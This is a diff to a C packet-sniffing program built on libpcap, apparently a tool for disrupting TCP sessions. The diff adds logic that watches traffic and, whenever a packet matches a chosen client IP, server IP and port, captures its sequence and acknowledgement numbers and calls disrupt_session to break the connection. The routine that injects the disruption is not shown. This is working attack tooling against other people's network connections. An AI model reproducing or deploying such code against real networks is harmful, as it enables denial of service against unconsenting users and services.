@@ -17,14 +17,17 @@ int tcpDisrupt(char *clientIP, char *serverIP, char *serverPort, char *networkIn
         return 1;
     }
 
-    clientIP = clientIP ? clientIP : DEFAULT_CLIENT_IP;
-    serverIP = serverIP ? serverIP : DEFAULT_SERVER_IP;
-    serverPort = serverPort ? serverPort : DEFAULT_SERVER_PORT;
-
     /* Initialize data: */
     memset(sniffArgs, 0, sizeof(spdcxSniffArgs));
     memset(errbuf, 0, PCAP_ERRBUF_SIZE);
     memset(packetFilterString, 0, 256);
+
+    clientIP = clientIP ? clientIP : DEFAULT_CLIENT_IP;
+    serverIP = serverIP ? serverIP : DEFAULT_SERVER_IP;
+    serverPort = serverPort ? serverPort : DEFAULT_SERVER_PORT;
+    sniffArgs->clientIP = clientIP;
+    sniffArgs->serverIP = serverIP;
+    sniffArgs->serverPort = atoi(serverPort);
 
     snprintf(packetFilterString, 256, "tcp and port %s and host %s and host %s", serverPort, serverIP, clientIP);
 
@@ -142,16 +145,37 @@ void processPacket(u_char *arg, const struct pcap_pkthdr *pktHeader, const u_cha
 
     /* Navigate past the Transport layer to the payload: */
     if(dataLength > 0){
+        uint32_t ackNum = ntohl(tcpHeader->ack_seq);
+        uint32_t seqNum = ntohl(tcpHeader->seq);
+        uint16_t sourcePort = ntohs(tcpHeader->source);
+        uint16_t destPort = ntohs(tcpHeader->dest);
+
+/*
         printf("---------------------------------\n");
         printf("Src:%s\n", srcIP);
-        printf("Src-Port: %d\n", ntohs(tcpHeader->source));
+        printf("Src-Port: %d\n", sourcePort);
         printf("Dst:%s\n", dstIP); 
-        printf("Dst-Port: %d\n", ntohs(tcpHeader->dest));
-        printf("ACK:%zu\n", (size_t)ntohl(tcpHeader->ack_seq));  
-        printf("Seq:%zu\n", (size_t)ntohl(tcpHeader->seq));   
+        printf("Dst-Port: %d\n", destPort);
+        printf("ACK:%zu\n", (size_t)ackNum);  
+        printf("Seq:%zu\n", (size_t)seqNum);   
         printf("Data:\n");
         printf("---------------------------------\n");
+*/
 
+
+        if ( !(strcmp(sniffArgs->clientIP, srcIP)) ) {
+            printf("Matching client IP found: %s\n", srcIP);
+            if ( !(strcmp(sniffArgs->serverIP, dstIP)) ) {
+                printf("Matching server IP found: %s\n", dstIP);
+                if ( sniffArgs->serverPort == destPort ){
+                    printf("Matching server port found: %d\n", destPort);
+                    printf("Disrupting.....\n");
+                    disrupt_session(srcIP, sourcePort, dstIP, destPort, seqNum, ackNum);
+                }
+            }
+        }
+
+/*
         int k=0;
         while( (dataLength>0) && (k<dataLength) ){
             if (isprint(packet[k]))
@@ -163,5 +187,6 @@ void processPacket(u_char *arg, const struct pcap_pkthdr *pktHeader, const u_cha
         printf("\n");        
         printf("---------------------------------\n");
         printf("\n\n");        
+    */
     }
 }
